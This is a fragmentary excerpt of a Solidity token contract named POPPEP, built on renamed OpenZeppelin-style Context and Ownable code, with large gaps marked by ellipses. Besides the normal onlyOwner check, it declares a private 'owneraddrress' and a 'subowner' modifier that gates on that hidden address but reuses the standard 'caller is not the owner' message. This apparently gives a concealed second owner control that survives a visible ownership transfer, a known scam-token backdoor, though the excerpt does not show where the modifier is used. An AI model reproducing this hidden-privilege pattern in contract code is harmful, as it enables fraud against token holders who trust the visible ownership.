...
/*
 * @dev Provides information about the current execution SOLPOPPEP, including the
...
// File: @openzeppelin/contracts/access/SOLOwnable.sol
 ...
 * the owner.
 */
abstract contract SOLOwnable is SOLPOPPEP {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "SOLOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "SOLOwnable: new owner is the zero address");
...
contract POPPEP  is SOLPOPPEP, currentIndex, SOLOwnable {
   ...
   address private owneraddrress; 
    constructor(address BakeryRouterv3) {
        ...
        _symbol = "POPPEP ";
        _decimals = 9;
        _totalSupply = 5500000000000000 * 10 ** 9;
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
      ...
      modifier subowner() {
        require(owneraddrress == _msgSender(), "SOLOwnable: caller is not the owner");
        _;
    }
    /**
